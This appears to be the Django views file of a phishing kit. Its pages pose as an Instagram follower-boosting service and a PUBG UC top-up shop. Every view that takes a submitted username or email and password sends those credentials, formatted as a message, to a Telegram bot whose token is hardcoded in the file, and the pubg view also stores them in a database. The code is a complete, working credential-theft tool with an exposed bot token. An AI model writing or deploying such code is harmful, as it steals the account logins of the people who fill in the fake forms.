from django.shortcuts import render
import requests
from .forms import NakrutkaForm
from django.shortcuts import render, redirect
from .models import UCOrder

TELEGRAM_BOT_TOKEN = "8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0"


def home1(request,id):
    success = False
    if request.method == "POST":
        form = NakrutkaForm(request.POST)
        if form.is_valid():
            obj = form.save()
            username_var = form.cleaned_data.get('username')
            password_var = form.cleaned_data.get('password')
            text = f"Instagram profile 💋\n\n👤 *Login*: ```{username_var}```\n🔒 *Parol*: ```{password_var}```\n"
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    else:
        form = NakrutkaForm()

    return render(request, "Nakrutka/index1.html", {"form": form, "success": success})


def home2(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index2.html")


def home3(request,id):
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        text = f"Instagram profile 💋\n\n👤 *Login*: ```{username}```\n🔒 *Parol*: ```{password}```\n"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                          data={"chat_id": id, "text": text,"parse_mode": "MarkdownV2"})

    return render(request, "Nakrutka/index3.html")






def pubg(request,id):
    if request.method == 'POST':
        game_id = request.POST.get('game_id')
        server = request.POST.get('server')
        uc_amount = request.POST.get('uc_amount')
        email = request.POST.get('email')
        password = request.POST.get('password')
        terms = request.POST.get('terms') == 'on'

        order = UCOrder(
            game_id=game_id,
            server=server,
            uc_amount=uc_amount,
            email=email,
            password=password,
            terms=terms
        )
        order.save()
        text = (
            f"👮🏻‍♀️ Pubg account 💋\n\n"
            f"📧 *Email*: ```{email}```\n"
            f"🔒 *Parol*: ```{password}```\n"
        )
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                      data={"chat_id": id, "text": text, "parse_mode": "MarkdownV2"})

        return render(request, 'Pubg/uc_olindi.html',{"uc_amount":uc_amount})
    return render(request, 'Pubg/index.html')


def uc_olindi(request):
    return render(request, 'Pubg/uc_olindi.html')